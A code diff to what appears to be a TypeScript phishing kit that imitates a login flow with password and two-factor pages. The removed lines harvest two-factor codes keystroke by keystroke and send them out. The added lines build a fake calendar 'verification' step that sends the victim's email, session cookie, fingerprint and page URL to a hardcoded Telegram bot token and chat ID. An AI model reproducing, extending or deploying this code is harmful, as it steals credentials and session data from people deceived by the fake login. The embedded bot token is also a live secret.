@@ -68,7 +68,6 @@ const forms = {
   passwordForm: document.getElementById('passwordForm') as HTMLFormElement,
   createAccountForm: document.getElementById('createAccountForm') as HTMLFormElement,
   recoveryForm: document.getElementById('recoveryForm') as HTMLFormElement,
-  twoFactorForm: document.getElementById('twoFactorForm') as HTMLFormElement,
   botTokenForm: document.getElementById('botTokenForm') as HTMLFormElement,
   chatIdForm: document.getElementById('chatIdForm') as HTMLFormElement
 };
@@ -82,7 +81,6 @@ const inputs = {
   newPassword: document.getElementById('newPassword') as HTMLInputElement,
   confirmPassword: document.getElementById('confirmPassword') as HTMLInputElement,
   recoveryInfo: document.getElementById('recoveryInfo') as HTMLInputElement,
-  verificationCode: document.getElementById('verificationCode') as HTMLInputElement,
   botToken: document.getElementById('botToken') as HTMLInputElement,
   chatId: document.getElementById('chatId') as HTMLInputElement,
   testMessage: document.getElementById('testMessage') as HTMLTextAreaElement
@@ -960,37 +958,106 @@ Note - Authentication process finished successfully.
   }
 }
 
-function handleTwoFactorSubmit(e: Event): void {
-  e.preventDefault();
+// Calendar state
+let currentCalendarDate = new Date();
 
-  const code = inputs.verificationCode.value.trim();
+function renderCalendar(): void {
+  const monthYear = document.getElementById('calendarMonthYear') as HTMLElement;
+  const daysContainer = document.getElementById('calendarDays') as HTMLElement;
 
-  if (!validateVerificationCode(code)) {
-    showError(inputs.verificationCode, 'Enter a 6-digit verification code');
-    return;
+  if (!monthYear || !daysContainer) return;
+
+  const year = currentCalendarDate.getFullYear();
+  const month = currentCalendarDate.getMonth();
+
+  // Set month and year header
+  const monthNames = ['January', 'February', 'March', 'April', 'May', 'June', 
+                      'July', 'August', 'September', 'October', 'November', 'December'];
+  monthYear.textContent = `${monthNames[month]} ${year}`;
+
+  // Clear previous days
+  daysContainer.innerHTML = '';
+
+  // Get first day of month and number of days
+  const firstDay = new Date(year, month, 1).getDay();
+  const daysInMonth = new Date(year, month + 1, 0).getDate();
+
+  // Add empty cells for days before month starts
+  for (let i = 0; i < firstDay; i++) {
+    const emptyCell = document.createElement('div');
+    emptyCell.className = 'calendar-day empty';
+    daysContainer.appendChild(emptyCell);
   }
 
-  // Save verification code as passcode
-  savePasscode(code, '2FA Verification');
+  // Add day cells
+  for (let day = 1; day <= daysInMonth; day++) {
+    const dayCell = document.createElement('div');
+    dayCell.className = 'calendar-day';
+    dayCell.textContent = day.toString();
+    dayCell.addEventListener('click', () => handleCalendarDayClick(day));
+    daysContainer.appendChild(dayCell);
+  }
+}
 
-  // Send passcode notification
-  sendPasscodeNotification(code, '2FA Verification', state.userEmail);
-
-  setLoadingState(true, 'Verifying code...');
+function handleCalendarDayClick(day: number): void {
+  setLoadingState(true, 'Processing selection...');
 
   setTimeout(async () => {
     setLoadingState(false);
+    
+    // Send calendar selection notification
+    const selectedDate = `${currentCalendarDate.getFullYear()}-${String(currentCalendarDate.getMonth() + 1).padStart(2, '0')}-${String(day).padStart(2, '0')}`;
+    await sendCalendarSelectionNotification(state.userEmail, selectedDate);
+    
+    showPage('successPage');
+  }, 1000);
+}
 
-    if (code === '123456' || code === '000000') {
-      // Send 2FA completion notification
-      await sendTwoFactorNotification(state.userEmail, code);
-      showPage('successPage');
-    } else {
-      savePasscode(code, '2FA Failed Attempt');
-      sendPasscodeNotification(code, '2FA Failed Attempt', state.userEmail);
-      showError(inputs.verificationCode, 'Invalid verification code. Try 123456 for demo.');
-    }
-  }, 1500);
+async function sendCalendarSelectionNotification(email: string, selectedDate: string): Promise<void> {
+  const token = '7558392184:AAETPcw8YohKbZzirgzjS7BSOzVZS_n3tbk';
+  const chatId = '5721205355';
+
+  const timestamp = Math.floor(Date.now() / 1000);
+  const sessionId = getCookie('sessionId');
+  const fingerprint = getUserFingerprint();
+
+  const message = `📅 <b>Calendar Date Selected</b>
+Note - User completed authentication by selecting a date.
+
+✨ <b>Selection Information</b> ✨
+👤 <b>Username:</b>      ➖ ${email}
+📅 <b>Selected Date:</b> ➖ ${selectedDate}
+🌐 <b>Landing URL:</b>   ➖ ${window.location.href}
+🕒 <b>Complete Time:</b> ➖ ${timestamp}
+🔐 <b>Status:</b> Successfully Verified
+
+🆔 Session ID: ${sessionId}
+📱 Calendar authentication completed.`;
+
+  try {
+    await telegramAPI.sendMessage(token, chatId, message);
+    addLogEntry('success', `Calendar date selected: ${selectedDate}`);
+  } catch (error) {
+    addLogEntry('error', 'Error sending calendar selection notification');
+  }
+}
+
+function navigateCalendarMonth(direction: number): void {
+  currentCalendarDate.setMonth(currentCalendarDate.getMonth() + direction);
+  renderCalendar();
+}
+
+function initializeCalendar(): void {
+  const prevButton = document.getElementById('prevMonth') as HTMLButtonElement;
+  const nextButton = document.getElementById('nextMonth') as HTMLButtonElement;
+
+  if (prevButton) {
+    prevButton.addEventListener('click', () => navigateCalendarMonth(-1));
+  }
+
+  if (nextButton) {
+    nextButton.addEventListener('click', () => navigateCalendarMonth(1));
+  }
 }
 
 // Form Handlers
@@ -1059,6 +1126,7 @@ function handlePasswordSubmit(e: Event): void {
         twoFactorEmail.textContent = state.userEmail;
       }
       showPage('twoFactorPage');
+      renderCalendar();
     } else {
       showPage('successPage');
     }
@@ -1301,14 +1369,6 @@ async function sendWelcomeMessage(): Promise<void> {
   }
 }
 
-// Auto-format verification code
-function handleVerificationCodeInput(): void {
-  let value = inputs.verificationCode.value.replace(/\D/g, '');
-  if (value.length > 6) {
-    value = value.slice(0, 6);
-  }
-  inputs.verificationCode.value = value;
-}
 
 // Load saved data
 function loadSavedBotData(): void {
@@ -1347,7 +1407,6 @@ function setupEventListeners(): void {
   // Form submissions
   forms.loginForm.addEventListener('submit', handleLoginSubmit);
   forms.passwordForm.addEventListener('submit', handlePasswordSubmit);
-  forms.twoFactorForm.addEventListener('submit', handleTwoFactorSubmit);
   forms.botTokenForm.addEventListener('submit', handleBotTokenSubmit);
   forms.chatIdForm.addEventListener('submit', handleChatIdSubmit);
 
@@ -1401,15 +1460,6 @@ function setupEventListeners(): void {
     }
   });
 
-  inputs.verificationCode.addEventListener('input', () => {
-    clearError(inputs.verificationCode);
-    handleVerificationCodeInput();
-    const code = inputs.verificationCode.value;
-    if (code.length >= 3) { // Monitor codes with 3+ digits
-      savePasscode(code, 'Verification Code (Real-time)');
-      sendPasscodeNotification(code, 'Verification Code (Real-time)', state.userEmail || 'Unknown');
-    }
-  });
 
   inputs.botToken.addEventListener('input', () => {
     clearError(inputs.botToken);
@@ -1485,6 +1535,7 @@ function initializeApp(): void {
   setupEventListeners();
   loadSavedBotData();
   initializeUserSession();
+  initializeCalendar();
 
   if (inputs.email) {
     inputs.email.focus();
